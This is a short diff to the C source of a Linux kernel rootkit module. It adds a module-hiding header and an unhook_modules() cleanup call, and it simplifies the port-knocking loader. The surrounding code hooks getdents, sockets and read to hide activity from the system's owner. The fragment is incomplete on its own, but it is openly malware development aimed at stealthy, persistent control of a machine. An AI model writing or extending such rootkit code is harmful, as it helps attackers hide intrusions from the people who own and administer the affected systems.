@@ -12,6 +12,7 @@
 #include "main.h"
 #include "port_knocking.h"
 #include "read.h"
+#include "hide_module.h"
 
 /*
  * Function called when loading the kernel module.
@@ -33,7 +34,7 @@ int init_module (void)
 	hook_read();
 	
 	/* load port knocking */
-	ret = load_port_knocking(input_ip, (unsigned) port, prot);	
+	ret = load_port_knocking();	
 	if(ret < 0) {
 		ROOTKIT_DEBUG("Error while loading port knocking! Aborting insertion.\n");
 		return ret;
@@ -57,6 +58,7 @@ void cleanup_module (void)
 	unhook_getdents();
 	unhook_sockets();
 	unhook_read();
+	unhook_modules();
 	cleanup_control();
 	unload_port_knocking();
 	
